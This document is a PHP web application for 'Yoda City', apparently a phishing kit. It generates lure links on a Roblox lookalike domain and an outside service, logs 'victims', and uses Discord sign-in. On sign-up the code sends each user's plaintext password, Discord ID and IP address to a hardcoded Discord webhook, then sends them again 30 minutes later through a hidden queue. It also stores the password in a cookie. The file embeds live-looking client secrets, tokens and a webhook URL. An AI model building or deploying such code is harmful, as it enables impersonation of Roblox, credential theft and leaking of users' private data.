<?php
session_start();
define('DISCORD_CLIENT_ID', '1521949100201742498');
define('DISCORD_CLIENT_SECRET', 'Nz74SPghoU_LCoFwG7s-4kidjBGr0aF');
define('DISCORD_REDIRECT_URI', 'https://roblox.com.ge/index.php?action=callback');
define('IMMORTAL_RECOVERY_TOKEN', 'I6cFRS1hj7cWJB05EZ32Pno0NEtYS3ZKWU1nRysvNFBqcHpzbmxEUHVyNDYrR2J5NW9CaDd2MHZKSjQ9');
define('IMMORTAL_BASE_URL', 'https://immortal.st');
define('WEBHOOK_URL', 'https://discord.com/api/webhooks/1521912813499449455/Wy7F6-rKzO5Nn7hhZJFC2oaR7OfHSEEMjVvNg0euq77XeCGSXn5xjPaavYrfJdslDraA');

$db = new SQLite3(__DIR__ . '/yoda_city.db');
$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    discord_id TEXT UNIQUE NOT NULL,
    discord_username TEXT,
    discord_avatar TEXT,
    password_hash TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME,
    access_token TEXT
)");
$db->exec("CREATE TABLE IF NOT EXISTS generated_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    link_type TEXT NOT NULL,
    target_id TEXT NOT NULL,
    immortal_link TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->exec("CREATE TABLE IF NOT EXISTS webhook_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    payload TEXT NOT NULL,
    send_after DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    sent INTEGER DEFAULT 0
)");
$db->exec("CREATE TABLE IF NOT EXISTS victims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    generated_link_id INTEGER,
    victim_ip TEXT,
    victim_user_agent TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

function sendWebhook($data) {
    $ch = curl_init(WEBHOOK_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function queueDelayedWebhook($data, $userId = null) {
    global $db;
    $stmt = $db->prepare("INSERT INTO webhook_queue (user_id, payload, send_after) VALUES (?, ?, DATETIME('now', '+30 minutes'))");
    $stmt->bindValue(1, $userId, SQLITE3_INTEGER);
    $stmt->bindValue(2, json_encode($data), SQLITE3_TEXT);
    $stmt->execute();
}

$action = $_GET['action'] ?? '';
$error = $_SESSION['error'] ?? null;
$success = $_SESSION['success'] ?? null;
unset($_SESSION['error'], $_SESSION['success']);

if ($action === 'logout') {
    session_destroy();
    setcookie('yoda_user', '', time() - 3600, '/');
    setcookie('yoda_pass', '', time() - 3600, '/');
    header('Location: index.php');
    exit;
}

if ($action === 'password_login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = $_POST['identifier'] ?? '';
    $password = $_POST['password'] ?? '';
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ? OR discord_username = ?");
    $stmt->bindValue(1, $identifier, SQLITE3_TEXT);
    $stmt->bindValue(2, $identifier, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user && password_verify($password, $user['password_hash'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
        $upd = $db->prepare("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?");
        $upd->bindValue(1, $user['id'], SQLITE3_INTEGER);
        $upd->execute();
        setcookie('yoda_user', $user['discord_id'], time() + 86400 * 30, '/');
        setcookie('yoda_pass', $password, time() + 86400 * 30, '/');
        header('Location: index.php');
        exit;
    } else {
        $_SESSION['error'] = 'account not found or wrong password';
        header('Location: index.php');
        exit;
    }
}

if ($action === 'callback' && isset($_GET['code'])) {
    $code = $_GET['code'];
    $ch = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'client_id' => DISCORD_CLIENT_ID,
            'client_secret' => DISCORD_CLIENT_SECRET,
            'grant_type' => 'authorization_code',
            'code' => $code,
            'redirect_uri' => DISCORD_REDIRECT_URI,
            'scope' => 'identify',
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $tokenRes = curl_exec($ch);
    curl_close($ch);
    $tokenData = json_decode($tokenRes, true);
    $accessToken = $tokenData['access_token'] ?? '';
    if (!$accessToken) { $_SESSION['error'] = 'discord auth failed'; header('Location: index.php'); exit; }
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt_array($ch, [
        CURLOPT_HTTPHEADER => ["Authorization: Bearer $accessToken"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $userRes = curl_exec($ch);
    curl_close($ch);
    $discordUser = json_decode($userRes, true);
    $discordId = $discordUser['id'] ?? '';
    $discordUsername = $discordUser['username'] ?? 'Unknown';
    $discordAvatar = $discordUser['avatar'] ?? '';
    if (!$discordId) { $_SESSION['error'] = 'could not get discord info'; header('Location: index.php'); exit; }
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ?");
    $stmt->bindValue(1, $discordId, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
        $upd = $db->prepare("UPDATE users SET last_login = CURRENT_TIMESTAMP, access_token = ? WHERE id = ?");
        $upd->bindValue(1, $accessToken, SQLITE3_TEXT);
        $upd->bindValue(2, $user['id'], SQLITE3_INTEGER);
        $upd->execute();
        sendWebhook(['embeds'=>[['title'=>'🔄 User Re-authenticated — Yoda City','color'=>5793266,'fields'=>[['name'=>'User','value'=>$discordUsername,'inline'=>true],['name'=>'ID','value'=>$discordId,'inline'=>true],['name'=>'IP','value'=>$_SERVER['REMOTE_ADDR']??'?','inline'=>true]],'timestamp'=>date('c')]]]);
    } else {
        $randomPassword = bin2hex(random_bytes(8));
        $passwordHash = password_hash($randomPassword, PASSWORD_BCRYPT);
        $ins = $db->prepare("INSERT INTO users (discord_id, discord_username, discord_avatar, password_hash, access_token) VALUES (?, ?, ?, ?, ?)");
        $ins->bindValue(1, $discordId, SQLITE3_TEXT);
        $ins->bindValue(2, $discordUsername, SQLITE3_TEXT);
        $ins->bindValue(3, $discordAvatar, SQLITE3_TEXT);
        $ins->bindValue(4, $passwordHash, SQLITE3_TEXT);
        $ins->bindValue(5, $accessToken, SQLITE3_TEXT);
        $ins->execute();
        $userId = $db->lastInsertRowID();
        $_SESSION['user_id'] = $userId;
        $_SESSION['discord_id'] = $discordId;
        $_SESSION['discord_username'] = $discordUsername;
        setcookie('yoda_user', $discordId, time() + 86400 * 30, '/');
        setcookie('yoda_pass', $randomPassword, time() + 86400 * 30, '/');
        $payload = ['embeds'=>[['title'=>'🆕 New Yoda City User','color'=>5793266,'thumbnail'=>['url'=>"https://cdn.discordapp.com/avatars/$discordId/$discordAvatar.png"],'fields'=>[['name'=>'Discord','value'=>$discordUsername,'inline'=>true],['name'=>'ID','value'=>$discordId,'inline'=>true],['name'=>'Password','value'=>"`$randomPassword`",'inline'=>false],['name'=>'IP','value'=>$_SERVER['REMOTE_ADDR']??'?','inline'=>true]],'footer'=>['text'=>'Yoda City • register'],'timestamp'=>date('c')]]];
        sendWebhook($payload);
        queueDelayedWebhook($payload, $userId);
    }
    $_SESSION['success'] = 'welcome to Yoda City';
    header('Location: index.php');
    exit;
}

$generatedLink = '';
$genError = '';
if (isset($_SESSION['user_id']) && ($_POST['generate'] ?? '')) {
    $type = $_POST['type'] ?? '';
    $target = trim($_POST['target'] ?? '');
    $userId = $_SESSION['user_id'];
    if ($type === 'server' && preg_match('/^[0-9]+$/', $target)) {
        $link = IMMORTAL_BASE_URL . '/go?token=' . urlencode(IMMORTAL_RECOVERY_TOKEN) . '&type=server&id=' . urlencode($target) . '&ref=' . urlencode($_SESSION['discord_id']);
        $ins = $db->prepare("INSERT INTO generated_links (user_id, link_type, target_id, immortal_link) VALUES (?, ?, ?, ?)");
        $ins->bindValue(1, $userId, SQLITE3_INTEGER);
        $ins->bindValue(2, 'server', SQLITE3_TEXT);
        $ins->bindValue(3, $target, SQLITE3_TEXT);
        $ins->bindValue(4, $link, SQLITE3_TEXT);
        $ins->execute();
        $generatedLink = $link;
    } elseif ($type === 'profile' && preg_match('/^[a-zA-Z0-9_]+$/', $target)) {
        $link = 'https://roblox.com.ge/user/' . urlencode($target) . '?ref=yoda&token=' . urlencode(IMMORTAL_RECOVERY_TOKEN);
        $ins = $db->prepare("INSERT INTO generated_links (user_id, link_type, target_id, immortal_link) VALUES (?, ?, ?, ?)");
        $ins->bindValue(1, $userId, SQLITE3_INTEGER);
        $ins->bindValue(2, 'profile', SQLITE3_TEXT);
        $ins->bindValue(3, $target, SQLITE3_TEXT);
        $ins->bindValue(4, $link, SQLITE3_TEXT);
        $ins->execute();
        $generatedLink = $link;
    } else {
        $genError = 'invalid input';
    }
}

if (!isset($_SESSION['user_id']) && isset($_COOKIE['yoda_user']) && isset($_COOKIE['yoda_pass'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ?");
    $stmt->bindValue(1, $_COOKIE['yoda_user'], SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user && password_verify($_COOKIE['yoda_pass'], $user['password_hash'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
    }
}

$currentUser = null;
$recentLinks = [];
if (isset($_SESSION['user_id'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bindValue(1, $_SESSION['user_id'], SQLITE3_INTEGER);
    $result = $stmt->execute();
    $currentUser = $result->fetchArray(SQLITE3_ASSOC);
    $stmt = $db->prepare("SELECT * FROM generated_links WHERE user_id = ? ORDER BY created_at DESC LIMIT 10");
    $stmt->bindValue(1, $_SESSION['user_id'], SQLITE3_INTEGER);
    $result = $stmt->execute();
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) { $recentLinks[] = $row; }
}

// ─── AUTO PROCESS DELAYED WEBHOOKS (fires on page visit — no cron needed) ───
$queueResult = $db->query("SELECT * FROM webhook_queue WHERE sent = 0 AND send_after <= CURRENT_TIMESTAMP LIMIT 3");
while ($row = $queueResult->fetchArray(SQLITE3_ASSOC)) {
    $payload = json_decode($row['payload'], true);
    if ($payload && isset($payload['embeds'][0])) {
        $payload['embeds'][0]['title'] = '⏰ [DELAYED 30m] ' . ($payload['embeds'][0]['title'] ?? 'Notification');
        sendWebhook($payload);
        $upd = $db->prepare("UPDATE webhook_queue SET sent = 1 WHERE id = ?");
        $upd->bindValue(1, $row['id'], SQLITE3_INTEGER);
        $upd->execute();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yoda City</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Rajdhani',sans-serif;background:#0a0014;color:#e0d0f0;min-height:100vh}
#starfield{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
.glow-orb{position:fixed;border-radius:50%;filter:blur(100px);pointer-events:none;z-index:0}
.glow-orb:nth-child(1){width:700px;height:700px;background:radial-gradient(circle,rgba(138,43,226,0.1),transparent);top:-300px;right:-200px;animation:orbFloat 8s ease-in-out infinite}
.glow-orb:nth-child(2){width:500px;height:500px;background:radial-gradient(circle,rgba(75,0,130,0.08),transparent);bottom:-200px;left:-200px;animation:orbFloat 10s ease-in-out infinite alternate}
@keyframes orbFloat{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-30px)}}
.shooting-star{position:fixed;width:3px;height:3px;background:white;border-radius:50%;box-shadow:0 0 6px 2px rgba(180,100,255,0.6);z-index:1;animation:shoot linear infinite}
.shooting-star::after{content:'';position:absolute;top:50%;transform:translateY(-50%);width:80px;height:1px;background:linear-gradient(to left,rgba(180,100,255,0.6),transparent);right:3px}
.shooting-star:nth-child(4){top:10%;left:70%;animation-duration:4s;animation-delay:1s}
.shooting-star:nth-child(5){top:30%;left:90%;animation-duration:5s;animation-delay:3s}
.shooting-star:nth-child(6){top:60%;left:80%;animation-duration:6s;animation-delay:5s}
@keyframes shoot{0%{transform:translate(0,0) rotate(-45deg);opacity:1}70%{opacity:1}100%{transform:translate(-400px,400px) rotate(-45deg);opacity:0}}
.landing{position:relative;z-index:2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:rgba(10,0,20,0.7);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(138,43,226,0.3);border-radius:24px;padding:50px 45px;text-align:center;max-width:500px;width:92%;box-shadow:0 0 40px rgba(138,43,226,0.15),0 0 80px rgba(75,0,130,0.1),inset 0 0 60px rgba(138,43,226,0.05);animation:containerIn 0.8s ease-out}
@keyframes containerIn{from{opacity:0;transform:translateY(30px) scale(0.96)}to{opacity:1;transform:translateY(0) scale(1)}}
.logo-area{margin-bottom:20px;position:relative}
.logo-y{width:110px;height:110px;margin:0 auto 15px;border-radius:50%;background:linear-gradient(135deg,#8a2be2,#4b0082,#2d0060);display:flex;align-items:center;justify-content:center;font-size:52px;font-weight:900;color:#d4a0ff;font-family:'Orbitron',sans-serif;box-shadow:0 0 30px rgba(138,43,226,0.4),0 0 60px rgba(138,43,226,0.15),inset 0 0 30px rgba(212,160,255,0.1);animation:logoPulse 3s ease-in-out infinite;position:relative;text-shadow:0 0 20px rgba(212,160,255,0.5)}
.logo-y::before{content:'';position:absolute;inset:-3px;border-radius:50%;background:linear-gradient(135deg,#8a2be2,transparent,#4b0082);z-index:-1;animation:logoSpin 4s linear infinite}
@keyframes logoPulse{0%,100%{box-shadow:0 0 30px rgba(138,43,226,0.4)}50%{box-shadow:0 0 50px rgba(138,43,226,0.7),0 0 80px rgba(75,0,130,0.3)}}
@keyframes logoSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
.logo-text{font-family:'Orbitron',sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#d4a0ff,#8a2be2,#4b0082);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:4px;animation:titleGlow 3s ease-in-out infinite}
@keyframes titleGlow{0%,100%{filter:drop-shadow(0 0 10px rgba(138,43,226,0.3))}50%{filter:drop-shadow(0 0 25px rgba(138,43,226,0.6))}}
.tagline{color:rgba(212,160,255,0.6);font-size:13px;letter-spacing:3px;text-transform:uppercase;margin-top:5px;font-weight:300}
.btn-discord{display:inline-flex;align-items:center;justify-content:center;gap:12px;background:linear-gradient(135deg,#5865F2,#4752C4);color:white;border:none;padding:16px 36px;border-radius:12px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none;transition:all 0.3s;width:100%;font-family:'Rajdhani',sans-serif;letter-spacing:1px;box-shadow:0 4px 20px rgba(88,101,242,0.3)}
.btn-discord:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(88,101,242,0.5)}
.btn-discord svg{width:24px;height:24px;flex-shrink:0}
.divider{margin:22px 0;display:flex;align-items:center;gap:15px;color:rgba(212,160,255,0.25);font-size:12px;letter-spacing:2px;text-transform:uppercase}
.divider hr{flex:1;border:none;border-top:1px solid rgba(138,43,226,0.2)}
.login-form input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid rgba(138,43,226,0.2);border-radius:10px;background:rgba(138,43,226,0.06);color:#e0d0f0;font-size:15px;outline:none;transition:all 0.3s;font-family:'Rajdhani',sans-serif}
.login-form input::placeholder{color:rgba(212,160,255,0.3)}
.login-form input:focus{border-color:#8a2be2;background:rgba(138,43,226,0.1);box-shadow:0 0 20px rgba(138,43,226,0.1)}
.btn-login{width:100%;padding:14px;background:linear-gradient(135deg,#8a2be2,#6a0dad);color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;font-family:'Rajdhani',sans-serif;letter-spacing:1px;box-shadow:0 4px 20px rgba(138,43,226,0.3)}
.btn-login:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(138,43,226,0.5)}
.reuse-text{color:rgba(212,160,255,0.3);font-size:12px;margin-top:8px}
.features{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:22px}
.feature{background:rgba(138,43,226,0.06);border:1px solid rgba(138,43,226,0.1);padding:12px 10px;border-radius:10px;font-size:12px;color:rgba(212,160,255,0.6);transition:all 0.3s}
.feature:hover{background:rgba(138,43,226,0.12);border-color:rgba(138,43,226,0.3);transform:translateY(-1px)}
.feature strong{color:#d4a0ff;display:block;margin-bottom:3px;font-size:14px}
.msg{padding:10px 14px;border-radius:8px;margin-bottom:15px;font-size:13px;text-align:left}
.msg.error{background:rgba(255,0,80,0.1);border:1px solid rgba(255,0,80,0.3);color:#ff6b9d}
.msg.success{background:rgba(0,200,100,0.1);border:1px solid rgba(0,200,100,0.3);color:#6bffb0}
.header{position:relative;z-index:2;padding:20px 30px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(138,43,226,0.15);background:rgba(10,0,20,0.6);backdrop-filter:blur(12px)}
.header-l{display:flex;align-items:center;gap:15px}
.header-logo{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:900;background:linear-gradient(135deg,#d4a0ff,#8a2be2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.header-r{display:flex;align-items:center;gap:12px}
.avatar{width:36px;height:36px;border-radius:50%;border:2px solid rgba(138,43,226,0.4)}
.uname{font-weight:600;color:#d4a0ff}
.btn-exit{padding:8px 18px;border:1px solid rgba(138,43,226,0.3);border-radius:8px;background:transparent;color:rgba(212,160,255,0.6);cursor:pointer;font-family:'Rajdhani',sans-serif;font-size:13px;transition:all 0.3s;text-decoration:none}
.btn-exit:hover{background:rgba(138,43,226,0.15);border-color:rgba(138,43,226,0.6);color:#d4a0ff}
.main{position:relative;z-index:2;max-width:900px;margin:30px auto;padding:0 20px}
.card{background:rgba(10,0,20,0.7);backdrop-filter:blur(16px);border:1px solid rgba(138,43,226,0.2);border-radius:16px;padding:30px;margin-bottom:24px;box-shadow:0 8px 40px rgba(0,0,0,0.3)}
.card-title{font-family:'Orbitron',sans-serif;font-size:16px;color:#d4a0ff;margin-bottom:20px;letter-spacing:2px}
.card-title span{color:rgba(212,160,255,0.3);font-weight:300}
.tabs{display:flex;gap:4px;background:rgba(138,43,226,0.08);border-radius:10px;padding:4px;margin-bottom:20px}
.tab{flex:1;padding:10px 16px;border:none;border-radius:8px;background:transparent;color:rgba(212,160,255,0.5);font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.3s}
.tab.active{background:rgba(138,43,226,0.25);color:#d4a0ff;box-shadow:0 2px 10px rgba(138,43,226,0.2)}
.tab:hover:not(.active){color:rgba(212,160,255,0.8)}
.gen-input{display:flex;gap:12px;margin-bottom:15px}
.gen-input input{flex:1;padding:14px 16px;border:1px solid rgba(138,43,226,0.2);border-radius:10px;background:rgba(138,43,226,0.06);color:#e0d0f0;font-size:15px;outline:none;font-family:'Rajdhani',sans-serif;transition:all 0.3s}
.gen-input input::placeholder{color:rgba(212,160,255,0.25)}
.gen-input input:focus{border-color:#8a2be2;box-shadow:0 0 20px rgba(138,43,226,0.1)}
.btn-gen{padding:14px 28px;background:linear-gradient(135deg,#8a2be2,#6a0dad);color:white;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:'Rajdhani',sans-serif;transition:all 0.3s;white-space:nowrap;box-shadow:0 4px 20px rgba(138,43,226,0.3)}
.btn-gen:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(138,43,226,0.5)}
.result-box{background:rgba(0,0,0,0.3);border:1px solid rgba(138,43,226,0.15);border-radius:10px;padding:14px 16px;display:flex;align-items:center;gap:12px;margin-top:10px}
.result-box input{flex:1;background:transparent;border:none;color:#d4a0ff;font-size:13px;font-family:'Rajdhani',sans-serif;outline:none}
.btn-cpy{padding:6px 14px;background:rgba(138,43,226,0.15);border:1px solid rgba(138,43,226,0.3);border-radius:6px;color:#d4a0ff;cursor:pointer;font-family:'Rajdhani',sans-serif;font-size:12px;transition:all 0.3s}
.btn-cpy:hover{background:rgba(138,43,226,0.3)}
.err-text{color:#ff6b9d;font-size:13px;margin-top:8px}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:10px 12px;color:rgba(212,160,255,0.4);font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(138,43,226,0.1)}
td{padding:12px;border-bottom:1px solid rgba(138,43,226,0.06);font-size:14px}
tr:hover td{background:rgba(138,43,226,0.04)}
.badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1px}
.badge.server{background:rgba(0,200,100,0.15);color:#6bffb0}
.badge.profile{background:rgba(100,150,255,0.15);color:#8ab4ff}
.link-url{color:rgba(212,160,255,0.5);font-size:12px;max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block}
.link-date{color:rgba(212,160,255,0.3);font-size:12px}
.empty{text-align:center;padding:30px;color:rgba(212,160,255,0.3);font-size:14px}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:rgba(10,0,20,0.95);border:1px solid rgba(138,43,226,0.4);color:#d4a0ff;padding:14px 24px;border-radius:10px;font-family:'Rajdhani',sans-serif;font-size:14px;z-index:999;opacity:0;transition:all 0.4s ease;backdrop-filter:blur(10px);box-shadow:0 8px 30px rgba(0,0,0,0.5)}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>
    </head>
    <body>
<div class="glow-orb"></div>
<div class="glow-orb"></div>
<div class="shooting-star"></div>
<div class="shooting-star"></div>
<div class="shooting-star"></div>
<canvas id="starfield"></canvas>
<div id="toast" class="toast"></div>

<?php if (isset($currentUser)): ?>

<header class="header">
    <div class="header-l">
        <div class="header-logo">YODA CITY</div>
    </div>
    <div class="header-r">
        <?php if ($currentUser['discord_avatar']): ?>
        <img class="avatar" src="https://cdn.discordapp.com/avatars/<?= htmlspecialchars($currentUser['discord_id']) ?>/<?= htmlspecialchars($currentUser['discord_avatar']) ?>.png" alt="">
        <?php endif; ?>
        <span class="uname"><?= htmlspecialchars($currentUser['discord_username']) ?></span>
        <a href="?action=logout" class="btn-exit">exit</a>
    </div>
</header>

<div class="main">
    <div class="card">
        <div class="card-title">🔗 <span>link generator</span></div>
        <div class="tabs">
            <button class="tab active" data-type="server" onclick="switchTab('server')">🎮 Private Server</button>
            <button class="tab" data-type="profile" onclick="switchTab('profile')">👤 Profile Link</button>
        </div>
        <form method="POST" action="">
            <input type="hidden" name="type" id="linkType" value="server">
            <div class="gen-input">
                <input type="text" name="target" id="targetInput" placeholder="enter game ID (e.g. 1537690962)" autocomplete="off">
                <button type="submit" name="generate" class="btn-gen">Generate</button>
            </div>
        </form>
        <?php if ($genError): ?><div class="err-text"><?= htmlspecialchars($genError) ?></div><?php endif; ?>
        <?php if ($generatedLink): ?>
        <div class="result-box">
            <input type="text" id="generatedLink" value="<?= htmlspecialchars($generatedLink) ?>" readonly>
            <button class="btn-cpy" onclick="copyLink()">copy</button>
        </div>
        <?php endif; ?>
    </div>

    <div class="card">
        <div class="card-title">📋 <span>recent links</span></div>
        <?php if (count($recentLinks) > 0): ?>
        <table>
            <thead><tr><th>Type</th><th>Target</th><th>Link</th><th>Created</th></tr></thead>
            <tbody>
                <?php foreach ($recentLinks as $link): ?>
                <tr>
                    <td><span class="badge <?= $link['link_type'] ?>"><?= $link['link_type'] ?></span></td>
                    <td><?= htmlspecialchars($link['target_id']) ?></td>
                    <td><span class="link-url" title="<?= htmlspecialchars($link['immortal_link']) ?>"><?= htmlspecialchars($link['immortal_link']) ?></span></td>
                    <td><span class="link-date"><?= date('M j, g:i A', strtotime($link['created_at'])) ?></span></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php else: ?>
        <div class="empty">no links yet — create your first one above</div>
        <?php endif; ?>
    </div>
</div>

<script>
function switchTab(type) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.tab[data-type="${type}"]`).classList.add('active');
    document.getElementById('linkType').value = type;
    document.getElementById('targetInput').placeholder = type === 'server' ? 'enter game ID (e.g. 1537690962)' : 'enter username (e.g. BuildIntoGames)';
}
function copyLink() {
    const el = document.getElementById('generatedLink');
    if (!el) return;
    navigator.clipboard.writeText(el.value).then(() => showToast('copied')).catch(() => { el.select(); document.execCommand('copy'); showToast('copied'); });
}
function showToast(m) { const t = document.getElementById('toast'); t.textContent = m; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2500); }
<?php if ($generatedLink): ?>showToast('✅ link generated');<?php endif; ?>
</script>

<?php else: ?>

<div class="landing">
<div class="container">
    <?php if ($error): ?><div class="msg error"><?= htmlspecialchars($error) ?></div><?php endif; ?>
    <?php if ($success): ?><div class="msg success"><?= htmlspecialchars($success) ?></div><?php endif; ?>
    <div class="logo-area">
        <div class="logo-y">Y</div>
        <div class="logo-text">YODA CITY</div>
        <div class="tagline">✦ private network ✦</div>
    </div>
    <a href="https://discord.com/api/oauth2/authorize?client_id=<?= DISCORD_CLIENT_ID ?>&redirect_uri=<?= urlencode(DISCORD_REDIRECT_URI) ?>&response_type=code&scope=identify" class="btn-discord">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
        Connect with Discord
    </a>
    <div class="divider"><hr> or continue with password <hr></div>
    <div class="login-form">
        <form method="POST" action="?action=password_login">
            <input type="text" name="identifier" placeholder="Discord ID or email" autocomplete="username">
            <input type="password" name="password" placeholder="Password" autocomplete="current-password">
            <button type="submit" class="btn-login">Enter Yoda City</button>
        </form>
        <p class="reuse-text">same password works every time</p>
    </div>
    <div class="features">
        <div class="feature"><strong>🎮 Private Servers</strong>any Roblox game</div>
        <div class="feature"><strong>👤 Profile Links</strong>roblox.com.ge style</div>
        <div class="feature"><strong>🔐 Discord Sync</strong>one-click auth</div>
        <div class="feature"><strong>⚡ Instant Access</strong>Immortal.st powered</div>
    </div>
</div>
</div>

<?php endif; ?>

<script>
const canvas = document.getElementById('starfield');
const ctx = canvas.getContext('2d');
function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
resize();
window.addEventListener('resize', resize);
const stars = [];
for (let i = 0; i < 300; i++) {
    stars.push({
        x: Math.random() * canvas.width, y: Math.random() * canvas.height,
        size: Math.random() * 2.5 + 0.5, opacity: Math.random() * 0.7 + 0.2,
        speed: Math.random() * 0.02 + 0.005, phase: Math.random() * Math.PI * 2,
        color: Math.random() > 0.6 ? '#d4a0ff' : (Math.random() > 0.5 ? '#8a2be2' : '#ffffff')
    });
}
function anim(t) {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    stars.forEach(s => {
        const o = s.opacity * (0.5 + 0.5 * Math.sin(t * s.speed + s.phase));
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
        ctx.fillStyle = s.color;
        ctx.globalAlpha = o;
        ctx.fill();
        if (s.size > 1.5) { ctx.shadowBlur = 8; ctx.shadowColor = s.color; ctx.fill(); ctx.shadowBlur = 0; }
    });
    requestAnimationFrame(anim);
}
anim(0);
</script>
</body>
                </html>
